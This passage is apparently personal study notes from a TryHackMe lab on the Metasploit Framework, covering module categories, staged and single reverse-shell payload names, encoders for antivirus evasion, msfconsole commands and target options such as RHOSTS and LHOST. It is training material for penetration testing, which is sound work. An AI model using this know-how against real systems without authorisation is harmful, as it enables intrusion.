<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Metasploit</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="3bd7d5fc-833c-4d2c-ac60-e6b2f337f9c1" class="page sans"><header><img class="page-cover-image" src="https://assets.tryhackme.com/room-banners/metasploit.png" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/ad5a831987ef92f60ea5ecd4b29523c3.png"/></div><h1 class="page-title">Metasploit</h1></header><div class="page-body"><h1 id="cdbbd1db-eee5-4509-bc37-27288267df5b" class=""><details open=""><summary><em><mark class="highlight-yellow_background">Introduction to Metasploit</mark></em></summary></details></h1><div class="indented"><p id="f24d0781-ccde-42bd-9f15-b63069338d18" class="">Metasploit by <strong>Rapid7 </strong>, written by <strong>Ruby</strong></p><p id="c4060d94-4847-49d5-895e-425adb89b1ce" class="">Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.</p><p id="2fba5620-d0d8-49dd-babf-b7d61d5c1f82" class="">Metasploit has two main versions:</p><ul id="99b548fb-cd60-4707-a239-3537c67365f0" class="bulleted-list"><li style="list-style-type:disc"><strong>Metasploit Pro</strong>: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).</li></ul><ul id="6b70e74e-70a4-44a2-87ca-7c9707ec977d" class="bulleted-list"><li style="list-style-type:disc"><strong>Metasploit Framework</strong>: The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions.</li></ul><p id="84fd5dc8-f98d-4c07-969e-4b7e317a8202" class="">The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.</p><p id="dad93ab4-bfa7-49b0-b5c3-693e4eb80f55" class="">The main components of the Metasploit Framework can be summarized as follows;</p><ul id="207054d2-e3a9-40bb-b815-dff3d85eee6c" class="bulleted-list"><li style="list-style-type:disc"><strong>msfconsole</strong>: The main command-line interface.</li></ul><ul id="89298f46-5aef-48e4-b01e-138ddff305d4" class="bulleted-list"><li style="list-style-type:disc"><strong>Modules</strong>: supporting modules such as exploits, scanners, payloads, etc.</li></ul><ul id="9c69f442-0c3e-4773-982e-0924567134ff" class="bulleted-list"><li style="list-style-type:disc"><strong>Tools</strong>: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.</li></ul></div><h1 id="f87d2c1e-f606-4c41-9536-81a82238f337" class=""><em><mark class="highlight-yellow_background">Modules &amp; categories</mark></em></h1><ul id="a1e73f18-19dd-491b-9c03-e4ebf07c5c9b" class="bulleted-list"><li style="list-style-type:disc"><strong>Exploit:</strong> A piece of code that uses a vulnerability present on the target system.</li></ul><ul id="88ce2680-a91d-4fa6-b3c4-b6f4fb2d6f66" class="bulleted-list"><li style="list-style-type:disc"><strong>Vulnerability:</strong> A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.</li></ul><ul id="8e75e63b-f31f-484e-8cca-d7bbe3cbc6e7" class="bulleted-list"><li style="list-style-type:disc"><strong>Payload:</strong> An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.</li></ul><p id="aa587f63-94c7-4ae5-a758-69a6daf8b306" class="">You can find out the meta’s Modules by:</p><p id="ee1872d3-27d2-4721-8bde-b6241b0ba033" class=""><code>cd</code> into the <strong>metasploit-framework</strong>/modules folder,</p><p id="3a8221f8-5977-42b6-a97e-d84106880975" class="">To find it: <code>locate -l 1 metasploit-framework/modules</code></p><p id="c78aeb30-459e-4423-8228-643d1b969bfa" class="">to list every module: <code>tree -L 1 </code><code><em>module</em></code></p><hr id="c60866be-4d00-48e2-8557-74ed5e149651"/><p id="175b01f5-dd9d-4a03-9880-9e353a51fac6" class=""><strong>Auxiliary: </strong>Any supporting module, such as scanners, crawlers and fuzzers, can be found here.</p><p id="a22fd191-6205-4d3c-bcd4-b357dc642d46" class=""><strong>Encoders: </strong>Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.</p><p id="224ee349-9129-4a31-8fe8-f62d743c5910" class=""><strong>Evasion: </strong>While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.</p><p id="101f68cf-ac4b-4c85-921f-9956e3e69a05" class=""><strong>Exploits: </strong>Exploits, neatly organized by target system.</p><p id="34edcee2-6d17-4954-a352-ca18fc5717f7" class=""><strong>NOPs: </strong>NOPs (No OPeration) do nothing, literally.</p><p id="61fe6acd-3e3a-49e3-ab30-6d7406ecc8bb" class=""><mark class="highlight-red"><strong>Payloads</strong></mark><strong>:</strong> Payloads are codes that will run on the target system.</p><ul id="7abf2d41-7ab5-43ec-96f7-9ae88642580b" class="toggle"><li><details open=""><summary><em>Payloads’ directories</em></summary><ul id="d2246423-86b5-434c-b22b-e1090aaabadc" class="bulleted-list"><li style="list-style-type:disc"><strong>Singles:</strong> Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.</li></ul><ul id="0ef6bfb0-bdab-4c61-bb84-0b5f38826258" class="bulleted-list"><li style="list-style-type:disc"><strong>Stagers:</strong> Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.</li></ul><ul id="fdf30fd9-b700-460f-a593-34790b19b6b8" class="bulleted-list"><li style="list-style-type:disc"><strong>Stages: </strong>Downloaded by the stager. This will allow you to use larger sized payloads.</li></ul><p id="10917035-6bfd-44c5-8c49-a9e6679a5972" class=""><strong>Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.</strong></p><ul id="20a10c6a-fd36-4cc2-b975-02a8346d6450" class="bulleted-list"><li style="list-style-type:disc">generic/shell_reverse_tcp</li></ul><ul id="171b857d-38c4-401b-b2fa-df053835cf8a" class="bulleted-list"><li style="list-style-type:disc">windows/x64/shell/reverse_tcp</li></ul><p id="32d3511c-7dc9-4aed-86ed-e54f87a71782" class="">Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.</p></details></li></ul><p id="5fbbd72a-6c5a-43b5-9563-fe61180022a3" class=""><strong>Post: </strong>Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.</p><h1 id="3abe2f58-ba12-4bfd-a3f2-a69e5332ad94" class=""><mark class="highlight-red_background"><em>Msfconsole &amp; Modules</em></mark></h1><table id="a5702571-9f34-4e39-b01d-ff5fdb55e291" class="simple-table"><thead class="simple-table-header"><tr id="c6862d04-9c2d-4ef9-b37f-84b5b889a022"><th id="=tyu" class="simple-table-header-color simple-table-header" style="width:199.9829559326172px">Command</th><th id="@|YP" class="simple-table-header-color simple-table-header" style="width:740.9933471679688px">Description</th></tr></thead><tbody><tr id="efa75f31-cc94-46e5-b737-ebfad10e2f18"><td id="=tyu" class="" style="width:199.9829559326172px"><mark class="highlight-gray">$</mark> msfconsole</td><td id="@|YP" class="" style="width:740.9933471679688px">Console will be your main interface to the Metasploit Framework.</td></tr><tr id="ede820ea-593a-40a2-842b-8af2c0bff18c"><td id="=tyu" class="" style="width:199.9829559326172px">clear</td><td id="@|YP" class="" style="width:740.9933471679688px">You can use some of regular command-line shell, like <code>ls</code> and <code>clear</code></td></tr><tr id="62f6df3a-290a-4c6c-b915-a7f7aea13b71"><td id="=tyu" class="" style="width:199.9829559326172px">help</td><td id="@|YP" class="" style="width:740.9933471679688px">You can press <mark class="highlight-brown"><strong><code>Tab</code></strong></mark><mark class="highlight-brown"><strong> </strong></mark>to show more options, like: <code>help set</code></td></tr><tr id="6d3e9fae-b4a5-48db-bfbc-9bf1c5a4eaa3"><td id="=tyu" class="" style="width:199.9829559326172px">history</td><td id="@|YP" class="" style="width:740.9933471679688px">see commands you have typed earlier.</td></tr><tr id="3ff472ae-59c2-46c4-88eb-5fa4c37bde7a"><td id="=tyu" class="" style="width:199.9829559326172px">search</td><td id="@|YP" class="" style="width:740.9933471679688px">search the Metasploit Framework database for modules relevant to the given search parameter.</td></tr><tr id="9e4de135-a82a-4b97-9039-1084f5c2a7ba"><td id="=tyu" class="" style="width:199.9829559326172px">use </td><td id="@|YP" class="" style="width:740.9933471679688px">you can follow it by the number at the beginning of the search result line.</td></tr><tr id="defebc78-1fe0-4f07-8044-7ea79d4c029a"><td id="=tyu" class="" style="width:199.9829559326172px">show</td><td id="@|YP" class="" style="width:740.9933471679688px">Press <mark class="highlight-brown"><code>tab</code></mark><mark class="highlight-brown"> </mark>to show more options, like: <code>show options</code></td></tr><tr id="0ec284f7-8681-4238-b8bd-44d703570972"><td id="=tyu" class="" style="width:199.9829559326172px">info</td><td id="@|YP" class="" style="width:740.9933471679688px">command can followed by the module’s path from the msfconsole prompt.</td></tr><tr id="dce3e575-df28-42bc-9a1e-e9085bda5079"><td id="=tyu" class="block-color-red_background" style="width:199.9829559326172px">back</td><td id="@|YP" class="block-color-red_background" style="width:740.9933471679688px">You can leave the context using it.</td></tr><tr id="df3905f2-d86a-4e50-8a01-ecbd0fc67968"><td id="=tyu" class="" style="width:199.9829559326172px">set</td><td id="@|YP" class="" style="width:740.9933471679688px">Ex: <code>set rhosts 10.10.165.39</code> , take a look at <code>options</code> of the module first.</td></tr><tr id="16e121b0-3ce9-4ce1-90f4-f1eb6c6b47b7"><td id="=tyu" class="" style="width:199.9829559326172px">setg</td><td id="@|YP" class="" style="width:740.9933471679688px">set values that will be used for all modules (global) , <code>set</code> is used for the current module only</td></tr><tr id="40d8fe61-8b11-4c2a-abf7-acef31d45697"><td id="=tyu" class="" style="width:199.9829559326172px">unset</td><td id="@|YP" class="" style="width:740.9933471679688px">clear any parameter value, or for all <code>unset all</code></td></tr><tr id="202bbeb7-c4fd-4a54-b6fc-f094c2847e81"><td id="=tyu" class="" style="width:199.9829559326172px">run | exploit</td><td id="@|YP" class="" style="width:740.9933471679688px">launch the module, <code>exploit -z</code> command will run the exploit and background the session as soon as it opens.</td></tr><tr id="321c4dd1-2573-4f93-95a0-e10e93399805"><td id="=tyu" class="" style="width:199.9829559326172px">check</td><td id="@|YP" class="" style="width:740.9933471679688px">Some modules support it , This will check if the target system is vulnerable without exploiting it.</td></tr><tr id="adf4ad84-221e-40f7-8d38-3b9923637ae7"><td id="=tyu" class="" style="width:199.9829559326172px">background | bg</td><td id="@|YP" class="" style="width:740.9933471679688px">background the session prompt and go back to the msfconsole prompt.</td></tr><tr id="7b09093f-c1b5-4abf-b9f8-b5cbd5b43e0c"><td id="=tyu" class="block-color-brown_background" style="width:199.9829559326172px"><mark class="highlight-brown">CTRL + Z</mark></td><td id="@|YP" class="block-color-brown_background" style="width:740.9933471679688px">used to background sessions. (can use in other shell tools, like nmap or to background the whole msfconsole)</td></tr><tr id="a2d4c45a-4325-4dab-bc58-52da6ec76d33"><td id="=tyu" class="block-color-gray_background" style="width:199.9829559326172px"><mark class="highlight-gray">$ jobs</mark></td><td id="@|YP" class="block-color-gray_background" style="width:740.9933471679688px">list the process are  running in background.</td></tr><tr id="95da794a-8644-43df-a735-bed00860bbb9"><td id="=tyu" class="block-color-gray_background" style="width:199.9829559326172px"><mark class="highlight-gray">$ fg</mark></td><td id="@|YP" class="block-color-gray_background" style="width:740.9933471679688px">bring the last process back to foreground, or <code>fg </code><strong><code>%job_id</code></strong>.</td></tr><tr id="5c705370-d339-4849-801a-1f89b954ce46"><td id="=tyu" class="block-color-gray_background" style="width:199.9829559326172px">$ kill -STOP | -QUIT %job_id</td><td id="@|YP" class="block-color-gray_background" style="width:740.9933471679688px">stop a process running on the background.</td></tr></tbody></table><p id="c6739703-42af-453f-90fe-cf751e2ad43b" class="">$ → running on the main shell (bash) others commands: on msfconsole shell.</p><p id="3cbdb6aa-9579-43fb-a72c-0c11e9857635" class="">| → = Or (the last word)</p><ul id="81afda4f-4207-4b56-8eca-958427480172" class="toggle"><li><details open=""><summary><mark class="highlight-orange"><strong>Common Options in modules</strong></mark></summary><p id="7750500c-f0c8-4123-947c-52461f93d51e" class="">• <strong>RHOSTS:</strong> “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt.</p><ul id="8a96663d-554e-423e-ac00-14a7f3e18a17" class="bulleted-list"><li style="list-style-type:disc"><strong>RPORT:</strong> “Remote port”, the port on the target system the vulnerable application is running on.</li></ul><ul id="e8795704-de0c-41b5-b0ae-5852cc355d51" class="bulleted-list"><li style="list-style-type:disc"><strong>PAYLOAD: </strong>The payload you will use with the exploit.</li></ul><ul id="f105b76c-9a4f-42d1-8e97-de4c3cf1fd5b" class="bulleted-list"><li style="list-style-type:disc"><strong>LHOST:</strong> “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.</li></ul><ul id="804091ff-45aa-4e2c-adbe-91971bef399c" class="bulleted-list"><li style="list-style-type:disc"><strong>LPORT:</strong> “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.</li></ul><ul id="50fa5cc6-6eb8-4e9b-82f2-35842a3a0e8b" class="bulleted-list"><li style="list-style-type:disc"><strong>SESSION:</strong> Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.</li></ul><p id="665d94b1-525d-4651-8a4b-faaecdfcfa49" class="">
</p><p id="2ab6e226-3f8e-41fd-b917-1d9fd82f5432" class="">
